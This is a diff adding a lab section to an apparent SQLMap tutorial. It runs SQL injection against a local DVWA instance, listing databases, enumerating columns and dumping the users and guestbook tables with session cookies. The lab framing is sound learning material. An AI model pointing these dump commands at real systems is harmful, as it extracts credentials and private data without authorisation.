@@ -196,8 +196,53 @@ Navigating to the SQLMap Directory:
 Change to the directory where SQLMap was cloned:
 
 cd sqlmap
+
 Running SQLMap
+
 python3 sqlmap.py -h
+
+# Testing Web Security Attacks in a Controlled Environment
+
+To deepen understanding, the knowledge was tested in a controlled, home network environment. DVWA (Damn Vulnerable Web Application) was used to simulate these attacks without risking real-world harm.
+
+# TESTING FOR VULNERABILITY IN THE WEB APPLICATION USING SQLMap To identify any possible injection points
+
+python3 sqlmap.py -u "http://localhost/DVWA/vulnerabilities/sqli/?id=5&Submit=Submit#" --batch --cookie="PHPSESSID=4ts7s0q1n1lecbb56jgsjsujpp; security=low"
+
+![Picture19](https://github.com/user-attachments/assets/04edeee2-868a-4d48-84db-147f18c12731)
+
+# RETRIEVING DATABASES USING SQLMAP
+
+python3 sqlmap.py -u "http://localhost/DVWA/vulnerabilities/sqli/?id=5&Submit=Submit#" --batch --cookie="PHPSESSID=4ts7s0q1n1lecbb56jgsjsujpp; security=low" --dbs
+
+![Picture20](https://github.com/user-attachments/assets/f3dabddf-86e1-48a7-ba8c-7c7593fa360e)
+
+# RETRIEVING ATTRIBUTES FROM THE TARGET TABLE USERS
+
+python3 sqlmap.py -u "http://localhost/DVWA/vulnerabilities/sqli/?id=5&Submit=Submit#" --cookie="PHPSESSID=4ts7s0q1n1lecbb56jgsjsujpp; security=low" -D dvwa -T users --columns
+
+![Picture21](https://github.com/user-attachments/assets/4fe21e1e-788a-4de7-9eab-b7e3306f4737)
+
+# RETRIEVING ATTRIBUTES FROM GUESTBOOK TABLE
+
+python3 sqlmap.py -u "http://localhost/DVWA/vulnerabilities/sqli/?id=5&Submit=Submit#" --cookie="PHPSESSID=4ts7s0q1n1lecbb56jgsjsujpp; security=low" -D dvwa -T guestbook --columns
+
+![Picture22](https://github.com/user-attachments/assets/9556f688-fcf6-4747-8d2c-980f18fd2ce7)
+
+# RETRIEVING ALL DETAILS ABOUT TABLE USERS
+
+python3 sqlmap.py -u "http://localhost/DVWA/vulnerabilities/sqli/?id=5&Submit=Submit#" --cookie="PHPSESSID=4ts7s0q1n1lecbb56jgsjsujpp; security=low" -D dvwa -T users --dump
+
+![Picture23](https://github.com/user-attachments/assets/c43e0081-b9bf-4a2f-927b-155fa3e81b19)
+
+# RETRIEVING ALL DETAILS ABOUT TABLE GUESTBOOK
+
+python3 sqlmap.py -u "http://localhost/DVWA/vulnerabilities/sqli/?id=5&Submit=Submit#" --cookie="PHPSESSID=4ts7s0q1n1lecbb56jgsjsujpp; security=low" -D dvwa -T guestbook --dump
+
+
+![Picture24](https://github.com/user-attachments/assets/079d07ab-3d96-4988-bf12-060fa302e189)
+
+
 
 
 # Testing Vulnerabilities
